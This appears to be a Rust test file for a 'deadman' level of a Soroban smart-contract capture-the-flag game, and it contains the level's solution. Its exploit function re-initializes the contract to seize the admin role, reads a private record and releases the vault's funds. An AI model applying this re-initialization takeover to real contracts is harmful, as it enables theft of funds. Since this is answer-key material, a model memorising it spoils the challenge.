use crate::harness::{auth, contract_error, errors, LevelSpec, Scenario};
use soroban_sdk::{contractclient, Address, Bytes, Env, IntoVal};

pub const SPEC: LevelSpec = LevelSpec {
    id: 2,
    slug: "deadman",
    interface: &[
        "__constructor",
        "admin",
        "balance",
        "initialize",
        "player",
        "read_private_record",
        "release",
        "released",
        "revealed",
        "who",
    ],
};

#[allow(dead_code)]
#[contractclient(name = "DeadmanClient")]
pub trait DeadmanInterface {
    fn initialize(env: Env, admin: Address);
    fn read_private_record(env: Env, admin: Address) -> Bytes;
    fn release(env: Env, admin: Address);
    fn admin(env: Env) -> Address;
    fn released(env: Env) -> bool;
    fn balance(env: Env, who: Address) -> i128;
    fn revealed(env: Env) -> bool;
}

fn initialize(c: &Scenario, instance: &Address, admin: &Address) {
    DeadmanClient::new(&c.env, instance)
        .mock_auths(&[auth(
            admin,
            instance,
            "initialize",
            (admin.clone(),).into_val(&c.env),
        )])
        .initialize(admin);
}

fn read(c: &Scenario, instance: &Address, admin: &Address) -> Bytes {
    DeadmanClient::new(&c.env, instance)
        .mock_auths(&[auth(
            admin,
            instance,
            "read_private_record",
            (admin.clone(),).into_val(&c.env),
        )])
        .read_private_record(admin)
}

fn release(c: &Scenario, instance: &Address, admin: &Address) {
    DeadmanClient::new(&c.env, instance)
        .mock_auths(&[auth(
            admin,
            instance,
            "release",
            (admin.clone(),).into_val(&c.env),
        )])
        .release(admin);
}

pub(crate) fn exploit(c: &Scenario, instance: &Address, player: &Address) {
    initialize(c, instance, player);
    let _ = read(c, instance, player);
    release(c, instance, player);
}

#[test]
fn the_objective_is_not_met_at_the_start() {
    let c = Scenario::new();
    let registry = c.create_instance(&c.player, SPEC.id);
    let client = DeadmanClient::new(&c.env, &registry);

    assert_eq!(
        client.admin(),
        registry,
        "the sealed identity is the contract itself"
    );
    assert_ne!(
        client.admin(),
        c.player,
        "the player must not start as admin"
    );
    assert!(!client.revealed(), "nothing has been read yet");
    assert!(!client.released(), "the vault has not been opened");
    assert_eq!(client.balance(&registry), 1_000);
    assert_eq!(client.balance(&c.player), 0);

    assert_eq!(
        c.submit(&c.player, &registry),
        Err(contract_error(errors::OBJECTIVE_NOT_MET)),
        "an untouched registry must not pass"
    );
}

#[test]
fn reading_with_the_original_admin_is_not_a_solution() {
    let c = Scenario::new();
    let registry = c.create_instance(&c.player, SPEC.id);
    let client = DeadmanClient::new(&c.env, &registry);

    assert!(
        client.try_read_private_record(&registry).is_err(),
        "the sealed admin is the contract address, and a contract address does not sign"
    );

    let signed_by_player = client
        .mock_auths(&[auth(
            &c.player,
            &registry,
            "read_private_record",
            (registry.clone(),).into_val(&c.env),
        )])
        .try_read_private_record(&registry);
    assert!(
        signed_by_player.is_err(),
        "the player's signature does not satisfy the stored admin"
    );
    assert!(!client.revealed(), "and nothing was read");
    assert_eq!(client.balance(&c.player), 0);

    assert_eq!(
        c.submit(&c.player, &registry),
        Err(contract_error(errors::OBJECTIVE_NOT_MET)),
        "reading with the original admin is not re-initialization"
    );
}

#[test]
fn the_record_alone_does_not_move_the_balance() {
    let c = Scenario::new();
    let registry = c.create_instance(&c.player, SPEC.id);

    initialize(&c, &registry, &c.player);
    let _ = read(&c, &registry, &c.player);

    let client = DeadmanClient::new(&c.env, &registry);
    assert!(client.revealed());
    assert!(!client.released());
    assert_eq!(client.balance(&c.player), 0);

    assert_eq!(
        c.submit(&c.player, &registry),
        Err(contract_error(errors::OBJECTIVE_NOT_MET)),
        "the record is the clue; the vault still needs the release"
    );
}

#[test]
fn release_before_takeover_is_refused() {
    let c = Scenario::new();
    let registry = c.create_instance(&c.player, SPEC.id);

    let result = DeadmanClient::new(&c.env, &registry)
        .mock_auths(&[auth(
            &c.player,
            &registry,
            "release",
            (c.player.clone(),).into_val(&c.env),
        )])
        .try_release(&c.player);

    assert!(result.is_err(), "the sealed admin is still the contract");
    assert_eq!(DeadmanClient::new(&c.env, &registry).balance(&c.player), 0);
}

#[test]
fn the_exploit_takes_over_the_registry_and_the_vault() {
    let c = Scenario::new();
    let registry = c.create_instance(&c.player, SPEC.id);

    exploit(&c, &registry, &c.player);

    let client = DeadmanClient::new(&c.env, &registry);
    assert_eq!(client.admin(), c.player, "the player is now the admin");
    assert!(client.revealed(), "the private record was read");
    assert!(client.released(), "the vault was released");
    assert_eq!(client.balance(&c.player), 1_000);
    assert_eq!(client.balance(&registry), 0);

    assert_eq!(c.submit(&c.player, &registry), Ok(()));
    assert!(c.is_completed(&c.player, SPEC.id));
}

#[test]
fn the_record_is_the_clue_and_it_is_not_empty() {
    let c = Scenario::new();
    let registry = c.create_instance(&c.player, SPEC.id);

    exploit(&c, &registry, &c.player);

    let record = read(&c, &registry, &c.player);
    assert_eq!(
        record,
        Bytes::from_slice(
            &c.env,
            b"WAREHOUSE 17 // LOWER MERIDIAN // DO NOT USE CITY ROUTING"
        ),
        "the record must carry the next destination"
    );
}

#[test]
fn submitting_twice_is_refused() {
    let c = Scenario::new();
    let registry = c.create_instance(&c.player, SPEC.id);
    exploit(&c, &registry, &c.player);

    assert_eq!(c.submit(&c.player, &registry), Ok(()));
    assert_eq!(
        c.submit(&c.player, &registry),
        Err(contract_error(errors::ALREADY_COMPLETED))
    );
}

#[test]
fn an_instance_the_core_did_not_create_is_refused() {
    let c = Scenario::new();
    let foreign = crate::harness::register(&c.env, &SPEC.instance_wasm(), (c.player.clone(),));

    exploit(&c, &foreign, &c.player);
    assert!(DeadmanClient::new(&c.env, &foreign).released());

    assert_eq!(
        c.submit(&c.player, &foreign),
        Err(contract_error(errors::UNKNOWN_INSTANCE))
    );
}
